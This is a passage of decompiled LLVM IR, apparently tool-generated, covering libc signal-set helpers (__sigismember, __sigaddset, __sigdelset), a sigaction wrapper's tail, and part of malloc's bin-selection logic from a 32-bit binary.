  %v1_80532cf = call i32 @__errno_location(i32 %v0_80532ac)
  store i32 %v1_80532cf, i32* %eax.global-to-local, align 4
  %v1_80532d4 = inttoptr i32 %v1_80532cf to i32*
  store i32 22, i32* %v1_80532d4, align 4
  br label %dec_label_pc_8053350

dec_label_pc_80532dc:                             ; preds = %dec_label_pc_80532ca
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532ea

dec_label_pc_80532ea:                             ; preds = %dec_label_pc_80532ea.dec_label_pc_80532ea_crit_edge, %dec_label_pc_80532dc
  %v0_80532ea = phi i32 [ %v15_80532ad, %dec_label_pc_80532dc ], [ %v0_80532ea.pre, %dec_label_pc_80532ea.dec_label_pc_80532ea_crit_edge ]
  %v1_80532f517 = phi i32 [ 31, %dec_label_pc_80532dc ], [ %v1_80532f5, %dec_label_pc_80532ea.dec_label_pc_80532ea_crit_edge ]
  %v2_80532ea = mul i32 %v1_80532f517, 4
  %v3_80532ea = add i32 %v2_80532ea, 160
  %v4_80532ea = add i32 %v3_80532ea, %v0_80532ea
  %v5_80532ea = inttoptr i32 %v4_80532ea to i32*
  store i32 0, i32* %v5_80532ea, align 4
  %v0_80532f5.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80532f5 = add i32 %v0_80532f5.pre, -1
  %v9_80532f5 = icmp slt i32 %v1_80532f5, 0
  store i32 %v1_80532f5, i32* %eax.global-to-local, align 4
  %v1_80532f6 = icmp eq i1 %v9_80532f5, false
  br i1 %v1_80532f6, label %dec_label_pc_80532ea.dec_label_pc_80532ea_crit_edge, label %dec_label_pc_80532f8

dec_label_pc_80532ea.dec_label_pc_80532ea_crit_edge: ; preds = %dec_label_pc_80532ea
  %v0_80532ea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80532ea

dec_label_pc_80532f8:                             ; preds = %dec_label_pc_80532ea
  %v0_80532f8 = load i32, i32* @edx, align 4
  %v2_80532fb = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_80532fb, i32* %eax.global-to-local, align 4
  %v4_8053303 = call i32 @__sigaddset(i32 %v2_80532fb, i32 %arg1, i32 %v0_80532f8, i32 %v0_80532f8)
  store i32 %v4_8053303, i32* %eax.global-to-local, align 4
  %v2_805330b = icmp slt i32 %v4_8053303, 0
  br i1 %v2_805330b, label %dec_label_pc_8053350, label %dec_label_pc_805330f

dec_label_pc_805330f:                             ; preds = %dec_label_pc_80532f8
  %v4_8053317 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8065b60.956 to i32), i32 %arg1, i32 %v4_8053303, i32 %v4_8053303)
  %v2_8053330 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8053335 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8053335, i32* %eax.global-to-local, align 4
  %v4_805333e = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8053330)
  store i32 %v4_805333e, i32* %eax.global-to-local, align 4
  %v2_8053346 = icmp slt i32 %v4_805333e, 0
  br i1 %v2_8053346, label %dec_label_pc_8053350, label %dec_label_pc_805334a

dec_label_pc_805334a:                             ; preds = %dec_label_pc_805330f
  %v3_805334a = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8053353

dec_label_pc_8053350:                             ; preds = %dec_label_pc_805330f, %dec_label_pc_80532f8, %dec_label_pc_80532cf
  br label %dec_label_pc_8053353

dec_label_pc_8053353:                             ; preds = %dec_label_pc_805334a, %dec_label_pc_8053350
  %storemerge = phi i32 [ -1, %dec_label_pc_8053350 ], [ %v3_805334a, %dec_label_pc_805334a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80532ac, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80532f5, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053353, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805336a = add i32 %arg2, -1
  %v1_805336d = urem i32 %v1_805336a, 32
  %v2_805336d = icmp eq i32 %v1_805336d, 0
  %v2_8053370 = udiv i32 %v1_805336a, 32
  br i1 %v2_805336d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8053373 = shl i32 1, %v1_805336d
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8053375 = phi i32 [ 1, %entry ], [ %v5_8053373, %bb ]
  %v2_8053375 = mul nuw nsw i32 %v2_8053370, 4
  %v3_8053375 = add i32 %v2_8053375, %arg1
  %v4_8053375 = inttoptr i32 %v3_8053375 to i32*
  %v5_8053375 = load i32, i32* %v4_8053375, align 4
  %v7_8053375 = and i32 %v5_8053375, %v6_8053375
  %v8_8053375 = icmp eq i32 %v7_8053375, 0
  %v1_8053379 = icmp eq i1 %v8_8053375, false
  %v2_8053379 = zext i1 %v1_8053379 to i32
  ret i32 %v2_8053379

; uselistorder directives
  uselistorder i32 %v1_805336d, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053380 = load i32, i32* @ebx, align 4
  store i32 %v0_8053380, i32* %stack_var_-4, align 4
  %v1_805338e = add i32 %arg2, -1
  %v1_8053391 = urem i32 %v1_805338e, 32
  %v2_8053391 = icmp eq i32 %v1_8053391, 0
  store i32 %v1_8053391, i32* @ecx, align 4
  %v2_8053394 = udiv i32 %v1_805338e, 32
  store i32 %v2_8053394, i32* @edx, align 4
  br i1 %v2_8053391, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8053397 = shl i32 1, %v1_8053391
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8053399 = phi i32 [ 1, %entry ], [ %v5_8053397, %bb ]
  %v2_8053399 = mul nuw nsw i32 %v2_8053394, 4
  %v3_8053399 = add i32 %v2_8053399, %arg1
  %v4_8053399 = inttoptr i32 %v3_8053399 to i32*
  %v5_8053399 = load i32, i32* %v4_8053399, align 4
  %v7_8053399 = or i32 %v5_8053399, %v6_8053399
  store i32 %v7_8053399, i32* %v4_8053399, align 4
  %v2_805339e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805339e, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8053394, { 1, 0 }
  uselistorder i32 %v1_8053391, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80533ae = add i32 %arg2, -1
  %v1_80533b1 = urem i32 %v1_80533ae, 32
  %v2_80533b1 = icmp eq i32 %v1_80533b1, 0
  %v2_80533b4 = udiv i32 %v1_80533ae, 32
  br i1 %v2_80533b1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_80533b7 = shl i32 -2, %v1_80533b1
  %v5_80533b7 = sub nsw i32 32, %v1_80533b1
  %v6_80533b7 = lshr i32 -2, %v5_80533b7
  %v7_80533b7 = or i32 %v6_80533b7, %v4_80533b7
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80533b9 = phi i32 [ -2, %entry ], [ %v7_80533b7, %bb ]
  %v2_80533b9 = mul nuw nsw i32 %v2_80533b4, 4
  %v3_80533b9 = add i32 %v2_80533b9, %arg1
  %v4_80533b9 = inttoptr i32 %v3_80533b9 to i32*
  %v5_80533b9 = load i32, i32* %v4_80533b9, align 4
  %v7_80533b9 = and i32 %v5_80533b9, %v6_80533b9
  store i32 %v7_80533b9, i32* %v4_80533b9, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80533b1, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_80533c0 = load i32, i32* @eax, align 4
  %v6_80533d3 = icmp ugt i32 %v0_80533c0, 16777215
  br i1 %v6_80533d3, label %dec_label_pc_80533e4, label %dec_label_pc_80533d5

dec_label_pc_80533d5:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_80533c0, 256
  %v2_80533c3 = udiv i32 %v0_80533c0, 256
  %v2_80533d5 = call i32 @llvm.ctlz.i32(i32 %v2_80533c3, i1 true)
  %v3_80533d5 = xor i32 %v2_80533d5, 31
  %v5_80533d5 = select i1 %tmp, i32 95, i32 %v3_80533d5
  %v1_80533d8 = add nuw nsw i32 %v5_80533d5, 6
  store i32 %v1_80533d8, i32* @ecx, align 4
  %v2_80533db = urem i32 %v1_80533d8, 32
  %v4_80533db = icmp eq i32 %v2_80533db, 0
  br i1 %v4_80533db, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80533d5
  %v5_80533db = lshr i32 %v0_80533c0, %v2_80533db
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80533d5, %bb
  %v0_80533dd = phi i32 [ %v0_80533c0, %dec_label_pc_80533d5 ], [ %v5_80533db, %bb ]
  %v1_80533dd = urem i32 %v0_80533dd, 4
  %v2_80533e0 = mul nuw nsw i32 %v5_80533d5, 4
  %v3_80533e0 = or i32 %v1_80533dd, 32
  %v4_80533e0 = add nuw nsw i32 %v3_80533e0, %v2_80533e0
  br label %dec_label_pc_80533e4

dec_label_pc_80533e4:                             ; preds = %entry, %bb4
  %v0_80533e5 = phi i32 [ 95, %entry ], [ %v4_80533e0, %bb4 ]
  ret i32 %v0_80533e5

; uselistorder directives
  uselistorder i32 %v2_80533db, { 1, 0 }
  uselistorder i32 %v0_80533c0, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_80533e4, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80533e6 = load i32, i32* @ebp, align 4
  %v0_80533e7 = load i32, i32* @edi, align 4
  %v0_80533e8 = load i32, i32* @esi, align 4
  %v0_80533e9 = load i32, i32* @ebx, align 4
  store i32 %v0_80533e9, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80533fb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80533fb, i32* @eax, align 4
  store i32 %v2_80533fb, i32* %stack_var_-92, align 4
  %v2_8053400 = call i32 @__pthread_return_void(i32 %v2_80533fb, i32 134564427)
  store i32 %v2_8053400, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f770.957 to i32), i32* %stack_var_-92, align 4
  %v1_805340c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f770.957 to i32))
  store i32 %v1_805340c, i32* %eax.global-to-local, align 4
  %v0_8053414 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_8053414, -32
  br i1 %tmp125, label %dec_label_pc_805342b, label %dec_label_pc_8053419

dec_label_pc_8053419:                             ; preds = %entry
  %v0_8053419 = load i32, i32* %stack_var_-92, align 4
  %v1_8053419 = call i32 @__errno_location(i32 %v0_8053419)
  store i32 %v1_8053419, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053420 = inttoptr i32 %v1_8053419 to i32*
  store i32 12, i32* %v1_8053420, align 4
  br label %dec_label_pc_8053b50

dec_label_pc_805342b:                             ; preds = %entry
  %v1_805342b = add i32 %v0_8053414, 11
  %tmp126 = icmp ult i32 %v1_805342b, 16
  br i1 %tmp126, label %dec_label_pc_8053442, label %dec_label_pc_805343b

dec_label_pc_805343b:                             ; preds = %dec_label_pc_805342b
  %v1_805343b = and i32 %v1_805342b, -8
  br label %dec_label_pc_8053442

dec_label_pc_8053442:                             ; preds = %dec_label_pc_805342b, %dec_label_pc_805343b
  %storemerge136 = phi i32 [ %v1_805343b, %dec_label_pc_805343b ], [ %v1_805342b, %dec_label_pc_805342b ]
  %v1_80537da = phi i32 [ %v1_805343b, %dec_label_pc_805343b ], [ 16, %dec_label_pc_805342b ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_8053442 = load i8, i8* @global_var_8065be0.958, align 1
  %v1_8053442 = sext i8 %v0_8053442 to i32
  store i32 %v1_8053442, i32* @ebx, align 4
  %v3_8053448 = urem i8 %v0_8053442, 2
  %v4_8053448 = icmp eq i8 %v3_8053448, 0
  %v1_805344b = icmp eq i1 %v4_8053448, false
  br i1 %v1_805344b, label %dec_label_pc_805346a, label %dec_label_pc_805344d

dec_label_pc_805344d:                             ; preds = %dec_label_pc_8053442
  %v2_805344d = icmp eq i8 %v0_8053442, 0
  %v1_805344f = icmp eq i1 %v2_805344d, false
  br i1 %v1_805344f, label %dec_label_pc_8053745, label %dec_label_pc_8053455

dec_label_pc_8053455:                             ; preds = %dec_label_pc_805344d
  store i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32* %stack_var_-92, align 4
  %v2_805345d = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065be0.958 to i32*))
  store i32 %v2_805345d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053745

dec_label_pc_805346a:                             ; preds = %dec_label_pc_8053442
  %v11_805346a = trunc i32 %v1_80537da to i8
  %v8_805346e = icmp ugt i8 %v11_805346a, %v0_8053442
  br i1 %v8_805346e, label %dec_label_pc_805348b, label %dec_label_pc_8053470

dec_label_pc_8053470:                             ; preds = %dec_label_pc_805346a
  %v2_8053474 = udiv i32 %v1_80537da, 2
  store i32 %v2_8053474, i32* %eax.global-to-local, align 4
  %v1_8053476 = add i32 %v2_8053474, ptrtoint (i8* @global_var_8065be0.958 to i32)
  store i32 %v1_8053476, i32* @ecx, align 4
  %v1_805347c = add i32 %v2_8053474, add (i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32 -4)
  %v2_805347c = inttoptr i32 %v1_805347c to i32*
  %v3_805347c = load i32, i32* %v2_805347c, align 4
  store i32 %v3_805347c, i32* @edx, align 4
  %v1_805347f = icmp eq i32 %v3_805347c, 0
  br i1 %v1_805347f, label %dec_label_pc_805348b, label %dec_label_pc_8053483

dec_label_pc_8053483:                             ; preds = %dec_label_pc_8053470
  %v1_8053483 = add i32 %v3_805347c, 8
  %v2_8053483 = inttoptr i32 %v1_8053483 to i32*
  %v3_8053483 = load i32, i32* %v2_8053483, align 4
  store i32 %v3_8053483, i32* %eax.global-to-local, align 4
  store i32 %v3_8053483, i32* %v2_805347c, align 4
  br label %dec_label_pc_80534c4

dec_label_pc_805348b:                             ; preds = %dec_label_pc_8053470, %dec_label_pc_805346a
  %v8_805348b = icmp ult i32 %v1_80537da, 255
  %v6_8053493 = icmp ugt i32 %v1_80537da, 255
  store i32 %v1_80537da, i32* @eax, align 4
  br i1 %v6_8053493, label %dec_label_pc_80534cc, label %dec_label_pc_8053495

dec_label_pc_8053495:                             ; preds = %dec_label_pc_805348b
  %v2_8053499 = udiv i32 %v1_80537da, 8
  store i32 %v2_8053499, i32* %eax.global-to-local, align 4
  %v1_80534a0 = mul nuw i32 %v2_8053499, 8
  %v2_80534a0 = add i32 %v1_80534a0, ptrtoint (i32* @global_var_8065c0c.959 to i32)
  store i32 %v2_80534a0, i32* @ecx, align 4
  %v1_80534a7 = add i32 %v1_80534a0, add (i32 ptrtoint (i32* @global_var_8065c0c.959 to i32), i32 12)
  %v2_80534a7 = inttoptr i32 %v1_80534a7 to i32*
  %v3_80534a7 = load i32, i32* %v2_80534a7, align 4
  store i32 %v3_80534a7, i32* @edx, align 4
  %v12_80534aa = icmp eq i32 %v3_80534a7, %v2_80534a0
  br i1 %v12_80534aa, label %dec_label_pc_80535c8.preheader, label %dec_label_pc_80534b2

dec_label_pc_80534b2:                             ; preds = %dec_label_pc_8053495
  store i32 %v1_80537da, i32* %ebx.global-to-local, align 4
  %v1_80534b6 = add i32 %v3_80534a7, 12
  %v2_80534b6 = inttoptr i32 %v1_80534b6 to i32*
  %v3_80534b6 = load i32, i32* %v2_80534b6, align 4
  store i32 %v3_80534b6, i32* %eax.global-to-local, align 4
  store i32 %v3_80534b6, i32* %v2_80534a7, align 4
  %v0_80534bc = load i32, i32* @edx, align 4
  %v1_80534bc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80534bc = add i32 %v0_80534bc, 4
  %v3_80534bc = add i32 %v2_80534bc, %v1_80534bc
  %v4_80534bc = inttoptr i32 %v3_80534bc to i32*
  %v5_80534bc = load i32, i32* %v4_80534bc, align 4
  %v6_80534bc = or i32 %v5_80534bc, 1
  store i32 %v6_80534bc, i32* %v4_80534bc, align 4
  %v0_80534c1 = load i32, i32* @ecx, align 4
  %v1_80534c1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80534c1 = add i32 %v1_80534c1, 8
  %v3_80534c1 = inttoptr i32 %v2_80534c1 to i32*
  store i32 %v0_80534c1, i32* %v3_80534c1, align 4
  br label %dec_label_pc_80534c4

dec_label_pc_80534c4:                             ; preds = %dec_label_pc_8053861, %dec_label_pc_8053873, %dec_label_pc_8053483, %dec_label_pc_80534b2
  %v0_80534c4 = load i32, i32* @edx, align 4
  %v1_80534c4 = add i32 %v0_80534c4, 8
  store i32 %v1_80534c4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b3f

dec_label_pc_80534cc:                             ; preds = %dec_label_pc_805348b
  %v0_80534d0 = call i32 @__malloc_largebin_index()
  store i32 %v0_80534d0, i32* %eax.global-to-local, align 4
  %v3_80534d5 = and i8 %v0_8053442, 2
  %v4_80534d5 = icmp eq i8 %v3_80534d5, 0
  %v6_80534d5 = zext i8 %v3_80534d5 to i32
  %v9_80534d5 = and i32 %v1_8053442, -256
  %v10_80534d5 = or i32 %v9_80534d5, %v6_80534d5
  store i32 %v10_80534d5, i32* @ebx, align 4
  br i1 %v4_80534d5, label %dec_label_pc_80535c8.preheader, label %dec_label_pc_80534e2

dec_label_pc_80534e2:                             ; preds = %dec_label_pc_80534cc
  store i32 ptrtoint (i8* @global_var_8065be0.958 to i32), i32* %stack_var_-92, align 4
  %v2_80534ea = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065be0.958 to i32*))
  store i32 %v2_80534ea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535c8.preheader

dec_label_pc_80535c8.preheader:                   ; preds = %dec_label_pc_80534e2, %dec_label_pc_8053495, %dec_label_pc_80534cc
  %stack_var_-40.0.ph = phi i32 [ %v2_8053499, %dec_label_pc_8053495 ], [ %v0_80534d0, %dec_label_pc_80534e2 ], [ %v0_80534d0, %dec_label_pc_80534cc ]
  %v1_805351e = add i32 %v1_80537da, 16
  %v0_80535c8107 = load i32, i32* @global_var_8065c20.962, align 32
  store i32 %v0_80535c8107, i32* @ebp, align 4
  %v9_80535ce109 = icmp eq i32 %v0_80535c8107, 134634516
  %v1_80535d4110 = icmp eq i1 %v9_80535ce109, false
  br i1 %v1_80535d4110, label %dec_label_pc_80534f7, label %dec_label_pc_80535da

dec_label_pc_80534f7:                             ; preds = %dec_label_pc_80535c8.preheader, %bb84
  %v0_80535c8111 = phi i32 [ %v0_80535c8, %bb84 ], [ %v0_80535c8107, %dec_label_pc_80535c8.preheader ]
  %v1_80534f7 = add i32 %v0_80535c8111, 4
  %v2_80534f7 = inttoptr i32 %v1_80534f7 to i32*
  %v3_80534f7 = load i32, i32* %v2_80534f7, align 4
  %v1_80534fa = add i32 %v0_80535c8111, 12
  %v2_80534fa = inttoptr i32 %v1_80534fa to i32*
  %v3_80534fa = load i32, i32* %v2_80534fa, align 4
  store i32 %v3_80534fa, i32* @edx, align 4
  %v1_80534fd = and i32 %v3_80534f7, -4
  store i32 %v1_80534fd, i32* @edi, align 4
  br i1 %v6_8053493, label %dec_label_pc_8053529, label %dec_label_pc_805350a

dec_label_pc_805350a:                             ; preds = %dec_label_pc_80534f7
  %v9_805350a = icmp eq i32 %v3_80534fa, 134634516
  %v1_8053510 = icmp eq i1 %v9_805350a, false
  br i1 %v1_8053510, label %dec_label_pc_8053529, label %dec_label_pc_8053512

dec_label_pc_8053512:                             ; preds = %dec_label_pc_805350a
  %v1_8053512 = load i32, i32* @global_var_8065c10.960, align 16
  %v12_8053512 = icmp eq i32 %v0_80535c8111, %v1_8053512
  %v1_8053518 = icmp eq i1 %v12_8053512, false
  br i1 %v1_8053518, label %dec_label_pc_8053529, label %dec_label_pc_805351a

dec_label_pc_805351a:                             ; preds = %dec_label_pc_8053512
  store i32 %v1_805351e, i32* %eax.global-to-local, align 4
  %v6_8053523 = icmp ugt i32 %v1_80534fd, %v1_805351e
  br i1 %v6_8053523, label %dec_label_pc_8053ada, label %dec_label_pc_8053529

dec_label_pc_8053529:                             ; preds = %dec_label_pc_805351a, %dec_label_pc_8053512, %dec_label_pc_805350a, %dec_label_pc_80534f7
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %eax.global-to-local, align 4
  %v2_805352e = add i32 %v3_80534fa, 8
  %v3_805352e = inttoptr i32 %v2_805352e to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v3_805352e, align 4
  %v0_8053531 = load i32, i32* @edx, align 4
  store i32 %v0_8053531, i32* @global_var_8065c20.962, align 4
  %v0_8053534 = load i32, i32* @edi, align 4
  %v15_8053534 = icmp eq i32 %v0_8053534, %v1_80537da
  br i1 %v15_8053534, label %dec_label_pc_8053b1b, label %dec_label_pc_805353e

dec_label_pc_805353e:                             ; preds = %dec_label_pc_8053529
  %v6_8053544 = icmp ugt i32 %v0_8053534, 255
  br i1 %v6_8053544, label %dec_label_pc_8053557, label %dec_label_pc_8053546

dec_label_pc_8053546:                             ; preds = %dec_label_pc_805353e
  %v2_8053548 = udiv i32 %v0_8053534, 8
  store i32 %v2_8053548, i32* %esi.global-to-local, align 4
  %v1_805354b = mul nuw i32 %v2_8053548, 8
  %v2_805354b = add i32 %v1_805354b, 134634508
  store i32 %v2_805354b, i32* @ebx, align 4
  %v1_8053552 = add i32 %v1_805354b, 134634516
  %v2_8053552 = inttoptr i32 %v1_8053552 to i32*
  %v3_8053552 = load i32, i32* %v2_8053552, align 4
  store i32 %v3_8053552, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535a0

dec_label_pc_8053557:                             ; preds = %dec_label_pc_805353e
  store i32 %v0_8053534, i32* @eax, align 4
  %v0_8053559 = call i32 @__malloc_largebin_index()
  store i32 %v0_8053559, i32* %esi.global-to-local, align 4
  %v1_8053560 = mul i32 %v0_8053559, 8
  %v2_8053560 = add i32 %v1_8053560, ptrtoint (i32* @global_var_8065c0c.959 to i32)
  store i32 %v2_8053560, i32* %eax.global-to-local, align 4
  %v1_8053567 = add i32 %v1_8053560, add (i32 ptrtoint (i32* @global_var_8065c0c.959 to i32), i32 8)
  %v2_8053567 = inttoptr i32 %v1_8053567 to i32*
  %v3_8053567 = load i32, i32* %v2_8053567, align 4
  store i32 %v3_8053567, i32* %edx.global-to-local, align 4
  store i32 %v3_8053567, i32* @ebx, align 4
  %v12_8053570 = icmp eq i32 %v3_8053567, %v2_8053560
  br i1 %v12_8053570, label %dec_label_pc_80535a0, label %dec_label_pc_8053574

dec_label_pc_8053574:                             ; preds = %dec_label_pc_8053557
  %v1_8053574 = add i32 %v1_8053560, add (i32 ptrtoint (i32* @global_var_8065c0c.959 to i32), i32 12)
  %v2_8053574 = inttoptr i32 %v1_8053574 to i32*
  %v3_8053574 = load i32, i32* %v2_8053574, align 4
  store i32 %v3_8053574, i32* @ebx, align 4
  %v0_8053577 = load i32, i32* @edi, align 4
  %v2_8053577 = add i32 %v3_8053574, 4
  %v3_8053577 = inttoptr i32 %v2_8053577 to i32*
  %v4_8053577 = load i32, i32* %v3_8053577, align 4
  %v10_8053577 = icmp ult i32 %v0_8053577, %v4_8053577
  %v1_805357a = icmp eq i1 %v10_8053577, false
  br i1 %v1_805357a, label %dec_label_pc_8053582, label %dec_label_pc_80535a0

dec_label_pc_8053582:                             ; preds = %dec_label_pc_8053574
  %v1_8053584 = or i32 %v0_8053577, 1
  store i32 %v1_8053584, i32* %eax.global-to-local, align 4
  store i32 %v3_8053567, i32* %ebx.global-to-local, align 4
  %v2_8053598101 = add i32 %v3_8053567, 4
  %v3_8053598102 = inttoptr i32 %v2_8053598101 to i32*
  %v4_8053598103 = load i32, i32* %v3_8053598102, align 4
  %v10_8053598104 = icmp ult i32 %v1_8053584, %v4_8053598103
  br i1 %v10_8053598104, label %dec_label_pc_8053589, label %dec_label_pc_805359d

dec_label_pc_8053589:                             ; preds = %dec_label_pc_8053582, %dec_label_pc_8053589
  %v0_805359d105 = phi i32 [ %v3_805358d, %dec_label_pc_8053589 ], [ %v3_8053567, %dec_label_pc_8053582 ]
  store i32 %v0_805359d105, i32* %ecx.global-to-local, align 4
  %v1_805358d = add i32 %v0_805359d105, 8
  %v2_805358d = inttoptr i32 %v1_805358d to i32*
  %v3_805358d = load i32, i32* %v2_805358d, align 4
  store i32 %v3_805358d, i32* %ecx.global-to-local, align 4
  store i32 %v3_805358d, i32* %ebx.global-to-local, align 4
  %v2_8053598 = add i32 %v3_805358d, 4
  %v3_8053598 = inttoptr i32 %v2_8053598 to i32*
  %v4_8053598 = load i32, i32* %v3_8053598, align 4
  %v10_8053598 = icmp ult i32 %v1_8053584, %v4_8053598
  br i1 %v10_8053598, label %dec_label_pc_8053589, label %dec_label_pc_805359d

dec_label_pc_805359d:                             ; preds = %dec_label_pc_8053589, %dec_label_pc_8053582
  %v0_805359d.lcssa = phi i32 [ %v3_8053567, %dec_label_pc_8053582 ], [ %v3_805358d, %dec_label_pc_8053589 ]
  %v1_805359d = add i32 %v0_805359d.lcssa, 12
  %v2_805359d = inttoptr i32 %v1_805359d to i32*
  %v3_805359d = load i32, i32* %v2_805359d, align 4
  store i32 %v3_805359d, i32* @ebx, align 4
  br label %dec_label_pc_80535a0

dec_label_pc_80535a0:                             ; preds = %dec_label_pc_8053546, %dec_label_pc_8053574, %dec_label_pc_8053557, %dec_label_pc_805359d
  %v0_80535a0 = phi i32 [ %v0_8053559, %dec_label_pc_8053557 ], [ %v0_8053559, %dec_label_pc_805359d ], [ %v0_8053559, %dec_label_pc_8053574 ], [ %v2_8053548, %dec_label_pc_8053546 ]
  %stack_var_-64.1 = phi i32 [ %v2_8053560, %dec_label_pc_8053557 ], [ %v0_805359d.lcssa, %dec_label_pc_805359d ], [ %v2_8053560, %dec_label_pc_8053574 ], [ %v3_8053552, %dec_label_pc_8053546 ]
  %v1_80535a2 = urem i32 %v0_80535a0, 32
  %v2_80535a2 = icmp eq i32 %v1_80535a2, 0
  store i32 %v1_80535a2, i32* %esi.global-to-local, align 4
  store i32 %v1_80535a2, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80535ac = sdiv i32 %v0_80535a0, 32
  store i32 %v2_80535ac, i32* %edx.global-to-local, align 4
  br i1 %v2_80535a2, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_80535a0
  %v5_80535af = shl i32 1, %v1_80535a2
  store i32 %v5_80535af, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_80535a0, %bb
  %v5_80535b1 = phi i32 [ 1, %dec_label_pc_80535a0 ], [ %v5_80535af, %bb ]
  %v1_80535b1 = mul nsw i32 %v2_80535ac, 4
  %v2_80535b1 = add i32 %v1_80535b1, ptrtoint (i32* @global_var_8065f14.963 to i32)
  %v3_80535b1 = inttoptr i32 %v2_80535b1 to i32*
  %v4_80535b1 = load i32, i32* %v3_80535b1, align 4
  %v6_80535b1 = or i32 %v4_80535b1, %v5_80535b1
  store i32 %v6_80535b1, i32* %v3_80535b1, align 4
  %v0_80535b8 = load i32, i32* @ebx, align 4
  %v1_80535b8 = load i32, i32* @ebp, align 4
  %v2_80535b8 = add i32 %v1_80535b8, 12
  %v3_80535b8 = inttoptr i32 %v2_80535b8 to i32*
  store i32 %v0_80535b8, i32* %v3_80535b8, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80535bf = load i32, i32* @ebp, align 4
  %v2_80535bf = add i32 %v1_80535bf, 8
  %v3_80535bf = inttoptr i32 %v2_80535bf to i32*
  store i32 %stack_var_-64.1, i32* %v3_80535bf, align 4
  %v0_80535c2 = load i32, i32* @ebp, align 4
  %v1_80535c2 = load i32, i32* @ebx, align 4
  %v2_80535c2 = add i32 %v1_80535c2, 8
  %v3_80535c2 = inttoptr i32 %v2_80535c2 to i32*
  store i32 %v0_80535c2, i32* %v3_80535c2, align 4
  %v0_80535c5 = load i32, i32* @ebp, align 4
  %v1_80535c5 = load i32, i32* @esi, align 4
  %v2_80535c5 = add i32 %v1_80535c5, 12
  %v3_80535c5 = inttoptr i32 %v2_80535c5 to i32*
  store i32 %v0_80535c5, i32* %v3_80535c5, align 4
  %v0_80535c8 = load i32, i32* @global_var_8065c20.962, align 32
  store i32 %v0_80535c8, i32* @ebp, align 4
  %v9_80535ce = icmp eq i32 %v0_80535c8, 134634516
  %v1_80535d4 = icmp eq i1 %v9_80535ce, false
